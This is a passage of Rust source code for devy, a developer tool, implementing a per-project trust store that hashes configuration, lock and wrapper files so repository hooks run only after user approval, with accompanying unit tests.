//! Per-project trust records keyed on the project root and SHA-256 digests of devy.yml and devy.lock.
//!
//! Cloning a repository and running devy must not run that repository's hooks, install
//! commands or shell environment until the user has reviewed and allowed them. A trust
//! record (one file per project, named by the SHA-256 of the canonical project root)
//! holds the root and digests of `devy.yml` and `devy.lock`; any byte change to either
//! file, or the same files at another path, is untrusted again.
//!
//! The store lives outside every project, in `$XDG_STATE_HOME/devy/trust/` (default
//! `~/.local/state/devy/trust/`) on Unix and `%LOCALAPPDATA%\devy\trust\` on Windows,
//! with a 0700 directory and 0600 records. There is deliberately no environment-variable
//! bypass: a repository can influence the environment (`.envrc`, shadowenv).

use anyhow::{Context, Result, anyhow, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{BufRead, ErrorKind, IsTerminal, Write};
use std::path::{Path, PathBuf};

use crate::config::DevyConfig;
use crate::config_diff;
use crate::output;

/// The non-interactive refusal, naming the fix.
pub const NOT_ALLOWED: &str = "project is not allowed — review devy.yml and run devy allow";

/// The error for a project that was not allowed (non-interactive run or declined
/// prompt). `devy up` does not record it as a failure for `devy doctor`.
#[derive(Debug)]
pub struct NotAllowed(pub String);

impl std::fmt::Display for NotAllowed {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for NotAllowed {}

/// Whether a project is trusted.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    Trusted,
    /// No record for this project root.
    NotAllowed,
    /// A record exists, but `devy.yml` or `devy.lock` changed since.
    Changed,
}

/// Digest value for a `devy.lock` that does not exist, distinct from any file's digest.
const LOCK_ABSENT: &str = "absent";
/// Digest value for a `devy.lock` that is not a regular file (devy refuses to load it).
const LOCK_NOT_REGULAR: &str = "not-a-regular-file";
/// Wrapper scripts and jars larger than this are recorded by size, not read.
const MAX_SCRIPT_BYTES: u64 = 64 * 1024 * 1024;
/// Records are a few hundred bytes; anything bigger is not one of ours.
const MAX_RECORD_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct Record {
    root: String,
    devy_yml: String,
    devy_lock: String,
    /// Digest of the trust summary the user saw. Files outside `devy.yml` decide some
    /// entries (a `package.json` added later makes devy run `npm install`), so a summary
    /// that changed is untrusted again even when `devy.yml` did not.
    summary: String,
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn sha256_hex(bytes: &[u8]) -> String {
    hex(&Sha256::digest(bytes))
}

fn digest_value(bytes: &[u8]) -> String {
    format!("sha256:{}", sha256_hex(bytes))
}

fn config_digest(root: &Path) -> Result<String> {
    let path = root.join("devy.yml");
    let bytes = fs::read(&path).with_context(|| format!("Failed to read {}", path.display()))?;
    Ok(digest_value(&bytes))
}

/// The lock's digest. Like the lock loader, a symlink is never followed.
fn lock_digest(root: &Path) -> Result<String> {
    let path = root.join(crate::lock::PATH);
    match fs::symlink_metadata(&path) {
        Err(e) if e.kind() == ErrorKind::NotFound => Ok(LOCK_ABSENT.to_string()),
        Err(e) => Err(e).with_context(|| format!("Failed to inspect {}", path.display())),
        Ok(meta) if !meta.file_type().is_file() => Ok(LOCK_NOT_REGULAR.to_string()),
        Ok(meta) if meta.len() > MAX_SCRIPT_BYTES => Ok(format!("too-large:{}", meta.len())),
        Ok(_) => {
            let bytes = crate::fs_safe::read_regular_capped(&path, MAX_SCRIPT_BYTES)
                .with_context(|| format!("Failed to read {}", path.display()))?;
            Ok(digest_value(&bytes))
        }
    }
}

/// Repository scripts devy runs directly (rather than through a package manager), whose
/// content is part of the summary digest: a pulled change to them asks again.
const RUN_DIRECTLY: &[&str] = &[
    "gradlew",
    "mvnw",
    "gradle/wrapper/gradle-wrapper.properties",
    "gradle/wrapper/gradle-wrapper.jar",
    ".mvn/wrapper/maven-wrapper.properties",
    ".mvn/wrapper/maven-wrapper.jar",
    ".mvn/wrapper/MavenWrapperDownloader.java",
];

/// Digest of the full trust summary of `config` at `root`, plus the content of the
/// scripts in [`RUN_DIRECTLY`]. It hashes the summary's wording, so a devy upgrade that
/// changes what the summary says asks again.
fn summary_digest(config: &DevyConfig, root: &Path) -> String {
    let mut bytes = Vec::new();
    let mut push = |part: &[u8]| {
        bytes.extend_from_slice(part);
        bytes.push(0);
    };
    for entry in config_diff::trust_summary(config, root) {
        push(entry.group.title().as_bytes());
        push(entry.key.as_bytes());
        push(entry.value.as_bytes());
    }
    for rel in RUN_DIRECTLY {
        let path = root.join(rel);
        let Ok(meta) = fs::symlink_metadata(&path) else {
            continue;
        };
        push(rel.as_bytes());
        // Only regular files of a sane size are read: never through a symlink (which
        // could point at /dev/zero), a FIFO that would block, or a huge file.
        if !meta.file_type().is_file() {
            push(LOCK_NOT_REGULAR.as_bytes());
        } else if meta.len() > MAX_SCRIPT_BYTES {
            push(format!("too-large:{}", meta.len()).as_bytes());
        } else {
            match fs::read(&path) {
                Ok(content) => push(sha256_hex(&content).as_bytes()),
                Err(_) => push(b"unreadable"),
            }
        }
    }
    for entry in shadowenv_entries(root) {
        push(entry.as_bytes());
    }
    digest_value(&bytes)
}

/// The entries of the project's `.shadowenv.d` other than the regular files devy and
/// shadowenv write (`500_devy.lisp`; and, unless named `*.lisp`, the `.gitignore` and
/// `.trust-<fingerprint>` of `shadowenv trust` and the `.error-<n>-<shell pid>` its hook
/// leaves while the directory is untrusted), sorted, each marked with its kind. Part of the summary digest: shadowenv trusts the directory,
/// not its content, so a pull that only adds lisp there makes the project untrusted
/// again (and the gate then removes shadowenv's trust). A `.shadowenv.d` that is not a
/// real directory is one entry of its own.
fn shadowenv_entries(root: &Path) -> Vec<String> {
    let dir = root.join(".shadowenv.d");
    match fs::symlink_metadata(&dir) {
        Err(_) => return Vec::new(),
        Ok(meta) if !meta.file_type().is_dir() => {
            return vec![".shadowenv.d:not-a-directory".to_string()];
        }
        Ok(_) => {}
    }
    let Ok(read) = fs::read_dir(&dir) else {
        return vec![".shadowenv.d:unreadable".to_string()];
    };
    let mut entries: Vec<String> = read
        .filter_map(|entry| {
            let entry = entry.ok()?;
            let name = entry.file_name().to_string_lossy().into_owned();
            let kind = match entry.file_type() {
                Ok(t) if t.is_file() => "file",
                Ok(t) if t.is_dir() => "dir",
                Ok(t) if t.is_symlink() => "symlink",
                _ => "other",
            };
            // Skipped as `refuse_foreign_entries` and the shell hook's guard accept them:
            // only regular files, and a `.trust-*`, `.error-*` or `.gitignore` only when
            // shadowenv would not evaluate it as lisp. shadowenv writes a new `.error-*`
            // for each shell that meets the untrusted directory, so counting one would
            // untrust the project again after every `devy allow`.
            // Whether `500_devy.lisp` is the file devy wrote is checked by the gate
            // (`require_with`).
            let lisp = name.to_ascii_lowercase().ends_with(".lisp");
            let skipped = name == crate::env_manager::shadowenv::ENV_FILENAME
                || (!lisp
                    && (name == ".gitignore"
                        || name.starts_with(".trust-")
                        || name.starts_with(".error-")));
            if kind == "file" && skipped {
                return None;
            }
            Some(format!(".shadowenv.d/{name}:{kind}"))
        })
        .collect();
    entries.sort();
    entries
}

fn canonical_root(root: &Path) -> Result<PathBuf> {
    fs::canonicalize(root).with_context(|| format!("Failed to resolve {}", root.display()))
}

/// What a trust decision is about: the project's canonical root and the digests of its
/// files and summary, taken once, before the summary is shown, so the user allows
/// exactly what they saw.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Snapshot {
    canonical: PathBuf,
    devy_yml: String,
    devy_lock: String,
    summary: String,
}

impl Snapshot {
    /// Takes the snapshot of the project at `root`, whose `devy.yml` loaded as `config`.
    pub fn take(root: &Path, config: &DevyConfig) -> Result<Self> {
        let canonical = canonical_root(root)?;
        Ok(Self {
            devy_yml: config_digest(&canonical)?,
            devy_lock: lock_digest(&canonical)?,
            summary: summary_digest(config, &canonical),
            canonical,
        })
    }

    /// Like [`Snapshot::take`], for a `devy.yml` not written yet: `devy_yml` is the
    /// content that will be written, and `config` what it parses as. Lets a caller take
    /// the snapshot before asking, then write the file only if the user agrees.
    pub fn for_contents(root: &Path, config: &DevyConfig, devy_yml: &[u8]) -> Result<Self> {
        let canonical = canonical_root(root)?;
        Ok(Self {
            devy_yml: digest_value(devy_yml),
            devy_lock: lock_digest(&canonical)?,
            summary: summary_digest(config, &canonical),
            canonical,
        })
    }

    /// The canonical project root.
    pub fn root(&self) -> &Path {
        &self.canonical
    }

    fn matches(&self, record: &Record) -> bool {
        record.devy_yml == self.devy_yml
            && record.devy_lock == self.devy_lock
            && record.summary == self.summary
    }
}

/// The per-user trust store.
#[derive(Debug, Clone)]
pub struct Store {
    /// `<state>/devy`, the parent of the `trust` directory.
    base: PathBuf,
    /// The store resolves to the platform default (`~/.local/state/devy`, or
    /// `%LOCALAPPDATA%\devy`), whichever variable named it.
    default_location: bool,
}

fn absolute_var(var: &str) -> Option<PathBuf> {
    std::env::var_os(var)
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
}

/// `$XDG_STATE_HOME` (when absolute) or `~/.local/state` on Unix; `%LOCALAPPDATA%` on
/// Windows.
fn state_home() -> Result<PathBuf> {
    #[cfg(windows)]
    {
        absolute_var("LOCALAPPDATA")
            .ok_or_else(|| anyhow!("Failed to locate the trust store: %LOCALAPPDATA% is not set"))
    }
    #[cfg(not(windows))]
    {
        absolute_var("XDG_STATE_HOME")
            .or_else(|| absolute_var("HOME").map(|home| home.join(".local").join("state")))
            .ok_or_else(|| {
                anyhow!("Failed to locate the trust store: neither XDG_STATE_HOME nor HOME is set")
            })
    }
}

/// Where a directory created at `path` (with `create_dir_all`) would really be: each
/// component that exists is resolved as the kernel resolves it (symlinks followed, `..`
/// taken physically), and once one is missing the rest would be created fresh, so a
/// `..` there only removes the missing component before it.
fn resolve_planned(path: &Path) -> PathBuf {
    use std::path::Component;
    let Ok(absolute) = std::path::absolute(path) else {
        return path.to_path_buf();
    };
    let mut prefix = PathBuf::new();
    let mut missing: Vec<std::ffi::OsString> = Vec::new();
    for component in absolute.components() {
        match component {
            Component::Prefix(_) | Component::RootDir => prefix.push(component.as_os_str()),
            Component::CurDir => {}
            Component::ParentDir => {
                if missing.pop().is_none() {
                    // `prefix` is canonical, so its lexical parent is its real parent.
                    prefix.pop();
                }
            }
            Component::Normal(part) => {
                if missing.is_empty() {
                    match fs::canonicalize(prefix.join(part)) {
                        Ok(real) => prefix = real,
                        Err(_) => missing.push(part.to_os_string()),
                    }
                } else {
                    missing.push(part.to_os_string());
                }
            }
        }
    }
    missing.iter().fold(prefix, |acc, part| acc.join(part))
}

/// Whether the store base `base` (`<state>/devy`) is the platform default: on Unix,
/// where `$HOME/.local/state/devy` resolves to, whether `XDG_STATE_HOME` named it or not.
fn is_default_base(base: &Path, home: Option<&Path>) -> bool {
    if cfg!(windows) {
        return true;
    }
    home.is_some_and(|home| {
        resolve_planned(base) == resolve_planned(&home.join(".local").join("state").join("devy"))
    })
}

impl Store {
    /// The store at its standard location. Nothing is created until a record is written.
    pub fn locate() -> Result<Self> {
        let store = Self::in_state_dir(&state_home()?);
        Ok(Self {
            default_location: is_default_base(&store.base, absolute_var("HOME").as_deref()),
            ..store
        })
    }

    /// The store under `state` (the `$XDG_STATE_HOME` equivalent).
    pub fn in_state_dir(state: &Path) -> Self {
        Self {
            base: state.join("devy"),
            default_location: false,
        }
    }

    fn dir(&self) -> PathBuf {
        self.base.join("trust")
    }

    /// Refuses a store the repository could supply: one inside the project could hold
    /// forged records (for example with `XDG_STATE_HOME` pointed into the project by its
    /// own environment, or shipped in a tarball). The one exception is the platform
    /// default location below a project at `$HOME` (a dotfiles repository), as long as
    /// git does not track it.
    /// A store not created yet is judged by where it would be created (its nearest
    /// existing ancestor, resolved), so it is refused before devy writes a record there.
    fn refuse_inside(&self, canonical_root: &Path) -> Result<()> {
        let store = resolve_planned(&self.base);
        let Ok(rel) = store.strip_prefix(canonical_root) else {
            return Ok(());
        };
        if !self.default_location {
            bail!(
                "the trust store {} is inside this project; set XDG_STATE_HOME (or LOCALAPPDATA) to a directory outside it",
                self.dir().display()
            );
        }
        if crate::fs_safe::git_tracked(canonical_root, &[rel.to_path_buf()])?.is_some() {
            bail!(
                "the trust store {} is tracked by git in this project; set XDG_STATE_HOME (or LOCALAPPDATA) to a directory outside it",
                self.dir().display()
            );
        }
        Ok(())
    }

    /// Creates the store directory (0700, owner-checked) when missing and returns it.
    fn ensure_dir(&self) -> Result<PathBuf> {
        self.ensure_subdir("trust")
    }

    /// Where devy keeps the copies of the `500_devy.lisp` files it wrote (see
    /// `shadowenv::COPY_SUBDIR`): `<state>/devy/shadowenv`, beside the trust records.
    pub(crate) fn env_copy_dir(&self) -> PathBuf {
        self.base.join(crate::env_manager::shadowenv::COPY_SUBDIR)
    }

    /// [`Store::env_copy_dir`], created (0700, owner-checked) when missing, for the project
    /// at `project_root`. Refused, like the store, when it is inside the project.
    pub(crate) fn ensure_env_copy_dir(&self, project_root: &Path) -> Result<PathBuf> {
        self.refuse_inside(&canonical_root(project_root)?)?;
        self.ensure_subdir(crate::env_manager::shadowenv::COPY_SUBDIR)
    }

    /// Creates `<base>/<name>` (0700, owner-checked, as is `<base>`) when missing and
    /// returns it.
    fn ensure_subdir(&self, name: &str) -> Result<PathBuf> {
        let state = self
            .base
            .parent()
            .ok_or_else(|| anyhow!("Failed to locate the trust store"))?;
        fs::create_dir_all(state)
            .with_context(|| format!("Failed to create {}", state.display()))?;
        #[cfg(unix)]
        let builder = {
            use std::os::unix::fs::DirBuilderExt;
            let mut builder = fs::DirBuilder::new();
            builder.mode(0o700);
            builder
        };
        #[cfg(not(unix))]
        let builder = fs::DirBuilder::new();
        match builder.create(&self.base) {
            Ok(()) => {}
            Err(e) if e.kind() == ErrorKind::AlreadyExists => {}
            Err(e) => {
                return Err(e).with_context(|| format!("Failed to create {}", self.base.display()));
            }
        }
        let meta = fs::symlink_metadata(&self.base)
            .with_context(|| format!("Failed to inspect {}", self.base.display()))?;
        if meta.file_type().is_symlink() || !meta.is_dir() {
            bail!(
                "{} is not a directory — remove it so devy can keep trust records there",
                self.base.display()
            );
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt;
            if meta.uid() != crate::fs_safe::current_uid() {
                bail!(
                    "{} is not owned by the current user — remove it so devy can keep trust records there",
                    self.base.display()
                );
            }
        }
        crate::fs_safe::private_dir(&self.base, name, false).map_err(|e| {
            anyhow!(
                "{e:#} (or run chmod 700 {} if you created it yourself)",
                self.base.join(name).display()
            )
        })
    }

    /// The store directory when it exists (checked like `ensure_dir`), `None` otherwise.
    fn existing_dir(&self) -> Result<Option<PathBuf>> {
        match fs::symlink_metadata(self.dir()) {
            Err(e) if e.kind() == ErrorKind::NotFound => Ok(None),
            _ => self.ensure_dir().map(Some),
        }
    }

    fn record_name(canonical: &Path) -> String {
        format!(
            "{}.json",
            sha256_hex(canonical.as_os_str().as_encoded_bytes())
        )
    }

    fn read_record(&self, canonical: &Path) -> Result<Option<Record>> {
        self.refuse_inside(canonical)?;
        let Some(dir) = self.existing_dir()? else {
            return Ok(None);
        };
        let path = dir.join(Self::record_name(canonical));
        let meta = match fs::symlink_metadata(&path) {
            Err(e) if e.kind() == ErrorKind::NotFound => return Ok(None),
            Err(e) => {
                return Err(e).with_context(|| format!("Failed to inspect {}", path.display()));
            }
            Ok(meta) => meta,
        };
        if !meta.file_type().is_file() || meta.len() > MAX_RECORD_BYTES {
            // Not a record devy wrote: treat the project as untrusted.
            return Ok(None);
        }
        let bytes =
            fs::read(&path).with_context(|| format!("Failed to read {}", path.display()))?;
        let record: Option<Record> = serde_json::from_slice(&bytes).ok();
        Ok(record.filter(|r| r.root == canonical.to_string_lossy()))
    }

    fn write_record(&self, canonical: &Path, record: &Record) -> Result<()> {
        self.refuse_inside(canonical)?;
        let dir = self.ensure_dir()?;
        let json = serde_json::to_vec_pretty(record).context("Failed to encode trust record")?;
        crate::fs_safe::write_atomic(&dir.join(Self::record_name(canonical)), &json, 0o600)
            .context("Failed to write trust record")
    }

    /// Whether the project in `snapshot` is trusted.
    pub fn status(&self, snapshot: &Snapshot) -> Result<Status> {
        match self.read_record(&snapshot.canonical)? {
            None => Ok(Status::NotAllowed),
            Some(record) if snapshot.matches(&record) => Ok(Status::Trusted),
            Some(_) => Ok(Status::Changed),
        }
    }

    /// Records trust for the project in `snapshot` and returns its canonical root. Fails
    /// when `devy.yml` or `devy.lock` changed since the snapshot was taken, so what is
    /// recorded is always what the user reviewed.
    pub fn allow(&self, snapshot: &Snapshot) -> Result<PathBuf> {
        let canonical = &snapshot.canonical;
        if config_digest(canonical)? != snapshot.devy_yml
            || lock_digest(canonical)? != snapshot.devy_lock
        {
            bail!(
                "devy.yml or devy.lock changed while you were reviewing it — run the command again"
            );
        }
        let record = Record {
            root: canonical.to_string_lossy().into_owned(),
            devy_yml: snapshot.devy_yml.clone(),
            devy_lock: snapshot.devy_lock.clone(),
            summary: snapshot.summary.clone(),
        };
        self.write_record(canonical, &record)?;
        Ok(canonical.clone())
    }

    /// Deletes the record for `root`, if any, and returns the canonical root.
    pub fn revoke(&self, root: &Path) -> Result<PathBuf> {
        let canonical = canonical_root(root)?;
        if let Some(dir) = self.existing_dir()? {
            let path = dir.join(Self::record_name(&canonical));
            match fs::remove_file(&path) {
                Ok(()) => {}
                Err(e) if e.kind() == ErrorKind::NotFound => {}
                Err(e) => {
                    return Err(e).with_context(|| format!("Failed to remove {}", path.display()));
                }
            }
        }
        Ok(canonical)
    }

    /// After devy itself wrote `written` to `devy.lock`: updates the record's lock digest
    /// to it. Only when the project was trusted at command start, so a write never
    /// upgrades an untrusted project, and never touching the `devy.yml` digest.
    pub fn refresh_lock(&self, root: &Path, written: &[u8], trusted_at_start: bool) -> Result<()> {
        if !trusted_at_start {
            return Ok(());
        }
        let canonical = canonical_root(root)?;
        let Some(mut record) = self.read_record(&canonical)? else {
            return Ok(());
        };
        let digest = digest_value(written);
        if record.devy_lock != digest {
            record.devy_lock = digest;
            self.write_record(&canonical, &record)?;
        }
        Ok(())
    }

    /// After devy itself wrote `written` (which parses as `config`) to `devy.yml`:
    /// updates the record's config and summary digests. Only when `start` (the project
    /// as it was trusted when the command started, loaded as `start_config`) still holds:
    /// the record is unchanged, the lock is the same, and the files around `devy.yml`
    /// still give the same summary, so nothing the user did not review becomes trusted.
    /// Callers must only do this for a change that adds or changes no executable entry
    /// (see `config_diff::diff`). Returns whether the record was updated.
    pub fn refresh_config(
        &self,
        start: &Snapshot,
        start_config: &DevyConfig,
        written: &[u8],
        config: &DevyConfig,
    ) -> Result<bool> {
        let canonical = &start.canonical;
        let Some(record) = self.read_record(canonical)? else {
            return Ok(false);
        };
        if !start.matches(&record)
            || lock_digest(canonical)? != start.devy_lock
            || summary_digest(start_config, canonical) != start.summary
        {
            return Ok(false);
        }
        let updated = Record {
            devy_yml: digest_value(written),
            summary: summary_digest(config, canonical),
            ..record
        };
        self.write_record(canonical, &updated)?;
        Ok(true)
    }
}

/// Whether the project at `root`, whose `devy.yml` loaded as `config`, is trusted now.
/// Any problem reading the store counts as untrusted.
pub fn is_trusted(root: &Path, config: &DevyConfig) -> bool {
    Store::locate()
        .and_then(|store| store.status(&Snapshot::take(root, config)?))
        .is_ok_and(|s| s == Status::Trusted)
}

/// `refresh_lock` on the standard store, warning instead of failing: a stale record only
/// means the next command asks again.
pub fn refresh_lock(root: &Path, written: &[u8], trusted_at_start: bool) {
    if let Err(e) = Store::locate().and_then(|s| s.refresh_lock(root, written, trusted_at_start)) {
        output::warn(&format!("could not update the trust record: {e:#}"));
    }
}

/// The project as trusted when a command started: its snapshot and the config it was
/// loaded as. `None` when it was not trusted then.
pub struct TrustedAtStart {
    pub snapshot: Snapshot,
    pub config: DevyConfig,
}

impl TrustedAtStart {
    /// Loads `devy.yml` at `config_path` and returns it with its snapshot when the
    /// project at `root` is trusted now.
    pub fn check(config_path: &Path, root: &Path) -> Option<Self> {
        let config = DevyConfig::load(config_path).ok()?;
        let snapshot = Snapshot::take(root, &config).ok()?;
        let store = Store::locate().ok()?;
        (store.status(&snapshot).ok()? == Status::Trusted).then_some(Self { snapshot, config })
    }
}

/// `refresh_config` on the standard store, warning instead of failing. Returns whether
/// the record was updated.
pub fn refresh_config(start: &TrustedAtStart, written: &[u8], config: &DevyConfig) -> bool {
    match Store::locate()
        .and_then(|s| s.refresh_config(&start.snapshot, &start.config, written, config))
    {
        Ok(updated) => updated,
        Err(e) => {
            output::warn(&format!("could not update the trust record: {e:#}"));
            false
        }
    }
}

/// The trust summary for `config` as printable lines, or a single line saying there is
/// nothing beyond installing the declared dependencies.
pub fn summary_lines(config: &DevyConfig, root: &Path) -> Vec<String> {
    let lines = config_diff::render_summary(&config_diff::trust_summary(config, root));
    if lines.is_empty() {
        vec!["No hooks, install commands, setup steps, package sources or execution-affecting environment variables.".to_string()]
    } else {
        lines
    }
}

/// The gate for commands that run project code (`up`, `down`, `start`, `restart`,
/// `exec`). Trusted projects pass silently. Otherwise, when stdin and stderr are
/// terminals the summary is shown and the user asked to allow the project; without a
/// terminal this fails with [`NOT_ALLOWED`]. Every error is a [`NotAllowed`], so nothing
/// (not even a failure record) is written for a project that did not pass.
///
/// `gate` says which command asks: only `devy up` hands the project back to shadowenv
/// afterwards, so the others say the shell environment stays off.
pub fn require(config: &DevyConfig, root: &Path, gate: Gate) -> Result<()> {
    let interactive = std::io::stdin().is_terminal() && std::io::stderr().is_terminal();
    let stdin = std::io::stdin();
    Store::locate()
        .inspect_err(|_| {
            // The trust check cannot be made: the project is not trusted.
            untrust_shadowenv(root);
        })
        .and_then(|store| {
            require_with(
                &store,
                config,
                root,
                Prompt {
                    interactive,
                    gate,
                    input: &mut stdin.lock(),
                    out: &mut std::io::stderr(),
                },
            )
        })
        .map_err(|e| match e.downcast::<NotAllowed>() {
            Ok(not_allowed) => not_allowed.into(),
            Err(other) => NotAllowed(format!("{other:#}")).into(),
        })
}

/// Removes shadowenv's trust files for the project at `root` (see
/// `shadowenv::remove_trust`), warning on failure. Returns whether any were removed.
pub fn untrust_shadowenv(root: &Path) -> bool {
    match crate::env_manager::shadowenv::remove_trust(root) {
        Ok(removed) => removed > 0,
        Err(e) => {
            output::warn(&format!("could not remove shadowenv trust: {e:#}"));
            false
        }
    }
}

/// `DevyConfig::load_with_root` for a command behind the trust gate: when `devy.yml` is
/// found but fails to load (a pulled change that no longer parses or validates), the
/// project cannot be trusted either, so shadowenv's trust goes before the error.
pub fn load_gated() -> Result<(DevyConfig, PathBuf)> {
    let (config_path, root) = DevyConfig::locate_root()?;
    match DevyConfig::load(&config_path) {
        Ok(config) => Ok((config, root)),
        Err(e) => {
            untrust_shadowenv(&root);
            Err(e)
        }
    }
}

/// Which command is behind the trust gate.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Gate {
    /// `devy up`, which runs `shadowenv trust` again once it succeeds.
    Up,
    /// `down`, `start`, `restart` and `exec`.
    Other,
}

/// How [`require_with`] asks: whether there is a terminal, which command asks, and the
/// prompt streams.
pub(crate) struct Prompt<'a> {
    pub interactive: bool,
    pub gate: Gate,
    pub input: &'a mut dyn BufRead,
    pub out: &'a mut dyn Write,
}

/// `require` with the store, terminal check and prompt streams supplied.
pub(crate) fn require_with(
    store: &Store,
    config: &DevyConfig,
    root: &Path,
    prompt_with: Prompt<'_>,
) -> Result<()> {
    let Prompt {
        interactive,
        gate,
        input,
        out,
    } = prompt_with;
    let checked =
        Snapshot::take(root, config).and_then(|snapshot| Ok((store.status(&snapshot)?, snapshot)));
    if let Ok((Status::Trusted, snapshot)) = &checked {
        // devy rewrites `500_devy.lisp` on every `up`, so its content can't be part of
        // the record; one that is not the file devy last wrote (a pull replaced it) is
        // never read by devy, but shadowenv would load it under a trust that covers the
        // directory, not its content. Its trust goes; `devy up` rewrites the file.
        let foreign =
            crate::env_manager::shadowenv::env_file_foreign(snapshot.root(), &store.env_copy_dir());
        if foreign && untrust_shadowenv(root) && gate != Gate::Up {
            out.write_all(
                b"devy removed shadowenv's trust: .shadowenv.d/500_devy.lisp is not the file devy wrote. The shell environment stays off until you run devy up.\n",
            )
            .context("Failed to write the trust prompt")?;
        }
        return Ok(());
    }
    // shadowenv trusts the directory, not its content: once `up` ran `shadowenv trust`,
    // any `.shadowenv.d/*.lisp` pulled later would load on every prompt. A project devy
    // does not trust now (or cannot check) loses shadowenv's trust too, before anything
    // is asked.
    let shadowenv_untrusted = untrust_shadowenv(root);
    let (status, snapshot) = checked?;
    if !interactive {
        return Err(NotAllowed(NOT_ALLOWED.to_string()).into());
    }
    let headline = match status {
        Status::Changed => {
            "devy.yml, devy.lock or the project files devy runs changed since this project was allowed"
        }
        _ => "This project has not been allowed",
    };
    let mut prompt = format!(
        "\n{headline}: {}\nAllowing it lets devy run:\n\n",
        output::clean_line(&snapshot.root().display().to_string())
    );
    for line in summary_lines(config, snapshot.root()) {
        prompt.push_str(&format!("  {line}\n"));
    }
    prompt.push_str("\nAllow and continue? [y/N] ");
    out.write_all(prompt.as_bytes())
        .and_then(|()| out.flush())
        .context("Failed to write the trust prompt")?;
    let mut answer = String::new();
    input
        .read_line(&mut answer)
        .context("Failed to read the answer")?;
    if matches!(answer.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
        store.allow(&snapshot)?;
        if shadowenv_untrusted && gate != Gate::Up {
            // Only `devy up` hands the project back to shadowenv.
            out.write_all(b"Allowed. The shell environment stays off until you run devy up.\n")
                .context("Failed to write the trust prompt")?;
        }
        Ok(())
    } else {
        Err(NotAllowed("project was not allowed".to_string()).into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Fixture {
        _state: crate::test_support::TempDir,
        project: crate::test_support::TempDir,
        store: Store,
    }

    fn fixture(yaml: &str) -> Fixture {
        let state = crate::test_support::tmp_dir();
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), yaml).unwrap();
        let store = Store::in_state_dir(&state);
        Fixture {
            _state: state,
            project,
            store,
        }
    }

    fn config(yaml: &str) -> DevyConfig {
        crate::yaml_safe::from_str_strict(yaml, "test").unwrap()
    }

    fn snap_at(root: &Path) -> Snapshot {
        let cfg = config(&std::fs::read_to_string(root.join("devy.yml")).unwrap());
        Snapshot::take(root, &cfg).unwrap()
    }

    fn status_at(f: &Fixture, root: &Path) -> Status {
        f.store.status(&snap_at(root)).unwrap()
    }

    fn status(f: &Fixture) -> Status {
        status_at(f, &f.project)
    }

    fn allow(f: &Fixture) -> PathBuf {
        f.store.allow(&snap_at(&f.project)).unwrap()
    }

    fn lock_bytes(f: &Fixture) -> Vec<u8> {
        std::fs::read(f.project.join("devy.lock")).unwrap()
    }

    #[test]
    fn unallowed_project_is_not_trusted_and_nothing_is_created() {
        let f = fixture("name: x\n");
        assert_eq!(status(&f), Status::NotAllowed);
        assert!(!f.store.dir().exists());
    }

    #[test]
    fn allow_then_status_is_trusted() {
        let f = fixture("name: x\n");
        allow(&f);
        assert_eq!(status(&f), Status::Trusted);
    }

    /// Scenario "Edited config invalidates trust".
    #[test]
    fn edited_config_invalidates_trust() {
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::write(
            f.project.join("devy.yml"),
            "name: x\nhooks:\n  before_up: evil\n",
        )
        .unwrap();
        assert_eq!(status(&f), Status::Changed);
        allow(&f);
        assert_eq!(status(&f), Status::Trusted);
    }

    #[test]
    fn lock_changes_invalidate_trust_and_absent_is_distinct_from_empty() {
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::write(f.project.join("devy.lock"), "").unwrap();
        assert_eq!(status(&f), Status::Changed);
        allow(&f);
        std::fs::write(f.project.join("devy.lock"), "dependencies: {}\n").unwrap();
        assert_eq!(status(&f), Status::Changed);
        std::fs::remove_file(f.project.join("devy.lock")).unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    /// Scenario "Same content at another path".
    #[test]
    fn copied_project_is_not_trusted() {
        let f = fixture("name: x\n");
        std::fs::write(f.project.join("devy.lock"), "dependencies: {}\n").unwrap();
        allow(&f);
        let copy = crate::test_support::tmp_dir();
        for name in ["devy.yml", "devy.lock"] {
            std::fs::copy(f.project.join(name), copy.join(name)).unwrap();
        }
        assert_eq!(status_at(&f, &copy), Status::NotAllowed);
        assert_eq!(status(&f), Status::Trusted);
    }

    #[test]
    fn record_for_another_root_under_the_same_name_is_ignored() {
        let f = fixture("name: x\n");
        let canonical = allow(&f);
        let path = f.store.dir().join(Store::record_name(&canonical));
        let mut record: Record = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
        record.root = "/somewhere/else".into();
        std::fs::write(&path, serde_json::to_vec(&record).unwrap()).unwrap();
        assert_eq!(status(&f), Status::NotAllowed);
    }

    #[test]
    fn revoke_removes_the_record_and_succeeds_without_one() {
        let f = fixture("name: x\n");
        f.store.revoke(&f.project).unwrap();
        allow(&f);
        f.store.revoke(&f.project).unwrap();
        assert_eq!(status(&f), Status::NotAllowed);
    }

    #[cfg(unix)]
    #[test]
    fn store_directory_and_records_are_private() {
        use std::os::unix::fs::PermissionsExt;
        let f = fixture("name: x\n");
        let canonical = allow(&f);
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode(&f.store.dir()), 0o700);
        assert_eq!(mode(&f.store.base), 0o700);
        assert_eq!(
            mode(&f.store.dir().join(Store::record_name(&canonical))),
            0o600
        );
    }

    #[cfg(unix)]
    #[test]
    fn world_writable_store_directory_is_refused() {
        use std::os::unix::fs::PermissionsExt;
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::set_permissions(f.store.dir(), std::fs::Permissions::from_mode(0o777)).unwrap();
